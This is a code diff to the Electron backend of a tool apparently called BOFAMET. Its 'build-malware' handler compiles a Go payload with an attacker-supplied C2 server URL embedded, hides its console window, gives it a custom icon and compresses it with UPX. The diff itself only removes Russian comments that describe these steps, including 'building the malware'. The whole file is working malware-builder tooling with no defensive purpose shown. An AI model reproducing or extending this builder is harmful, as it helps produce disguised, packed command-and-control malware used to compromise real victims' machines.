@@ -46,28 +46,26 @@ app.on('window-all-closed', () => {
 ipcMain.on('build-malware', async (event, { c2Url, outputFileName, iconPath, outputDirectory, useUpx }) => {
   console.log(`BOFAMET: Build command received! C2 URL: ${c2Url}, Output file: ${outputFileName}, Icon: ${iconPath}, Output directory: ${outputDirectory}, Use UPX: ${useUpx}.`);
 
-  const goSourceDirInsideBuilder = path.join(process.resourcesPath, 'go_module'); // ИСПРАВЛЕННЫЙ ПУТЬ
-  const tempBuildDir = path.join(os.tmpdir(), `bofamet_build_${Date.now()}`); // Временная папка для сборки
+  const goSourceDirInsideBuilder = path.join(process.resourcesPath, 'go_module'); 
+  const tempBuildDir = path.join(os.tmpdir(), `bofamet_build_${Date.now()}`); 
   const mainGoPathInTemp = path.join(tempBuildDir, 'main.go');
   const tempIconPathInTemp = path.join(tempBuildDir, 'icon.ico');
   const rsrcSysoPathInTemp = path.join(tempBuildDir, 'rsrc.syso');
 
-  const upxExecutablePath = path.join(process.resourcesPath, 'upx.exe'); // ИСПРАВЛЕННЫЙ ПУТЬ
+  const upxExecutablePath = path.join(process.resourcesPath, 'upx.exe'); 
 
-  let targetOutputDirectory = goSourceDirInsideBuilder; // На случай, если outputDirectory не указан
+  let targetOutputDirectory = goSourceDirInsideBuilder; 
   if (outputDirectory) {
     targetOutputDirectory = outputDirectory;
   }
   const finalExecutablePath = path.join(targetOutputDirectory, outputFileName + '.exe');
 
   try {
-    // 1. Копируем исходники Go во временную папку
     console.log(`BOFAMET: Copying Go source from ${goSourceDirInsideBuilder} to temporary directory ${tempBuildDir}...`);
     await fs.promises.mkdir(tempBuildDir, { recursive: true });
     await fs.promises.cp(goSourceDirInsideBuilder, tempBuildDir, { recursive: true });
     console.log('BOFAMET: Go source copied to temporary directory.');
 
-    // 2. Устанавливаем rsrc (если не установлен) во временной папке
     console.log(`BOFAMET: Running go get github.com/akavel/rsrc in ${tempBuildDir}...`);
     const getRsrcCommand = `go get github.com/akavel/rsrc`;
     const { stdout: getRsrcStdout, stderr: getRsrcStderr } = await execPromise(getRsrcCommand, { cwd: tempBuildDir });
@@ -77,7 +75,6 @@ ipcMain.on('build-malware', async (event, { c2Url, outputFileName, iconPath, out
     }
     console.log('BOFAMET: go get rsrc completed.');
 
-    // 3. Обрабатываем иконку
     if (iconPath) {
       console.log(`BOFAMET: Copying icon from ${iconPath} to ${tempIconPathInTemp}...`);
       await fs.promises.copyFile(iconPath, tempIconPathInTemp);
@@ -101,7 +98,6 @@ ipcMain.on('build-malware', async (event, { c2Url, outputFileName, iconPath, out
       }
     }
 
-    // 4. Собираем малварь
     const buildCommand = `go build -ldflags "-X 'main.c2ServerURL=${c2Url}' -H=windowsgui" -o "${finalExecutablePath}" "${mainGoPathInTemp}"`;
     console.log(`BOFAMET: Starting Go malware build: ${buildCommand} in ${tempBuildDir}...`);
 
@@ -112,7 +108,6 @@ ipcMain.on('build-malware', async (event, { c2Url, outputFileName, iconPath, out
         console.warn(`BOFAMET: Warnings during Go malware build: ${buildStderr}`);
     }
 
-    // 5. UPX сжатие
     if (useUpx) {
         console.log(`BOFAMET: Starting UPX compression for ${finalExecutablePath}...`);
         const upxCommand = `"${upxExecutablePath}" --best --lzma "${finalExecutablePath}"`;
@@ -148,7 +143,6 @@ ipcMain.on('build-malware', async (event, { c2Url, outputFileName, iconPath, out
     dialog.showErrorBox('Build Error', `Failed to build malware: ${err.message}`);
     event.reply('build-result', { success: false, message: `Error: ${err.message}` });
   } finally {
-    // 6. Очистка временных файлов
     try {
         if (fs.existsSync(tempBuildDir)) {
             await fs.promises.rm(tempBuildDir, { recursive: true, force: true });
